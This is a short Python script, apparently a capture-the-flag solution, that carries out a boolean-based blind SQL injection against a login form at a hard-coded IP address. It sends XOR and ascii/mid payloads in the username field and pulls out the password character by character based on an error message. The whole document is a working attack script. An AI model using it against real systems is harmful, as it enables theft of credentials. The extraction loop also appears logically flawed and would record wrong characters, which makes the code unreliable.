import requests

url = 'http://60.205.200.177:49163/index.php'

r = requests.Session()
result = ''
for i in range(1, 33):
    for j in range(37, 127):
        payload = "admin'^(ascii(mid((password)from({0})))>{1})#".format(str(i), str(j))
        print(payload)
        data = {"username": payload, "password": "asd"}
        html = r.post(url, data=data)
        if "password error!" in html.text:
            result += chr(j)
            print (result)
            break
print(result)
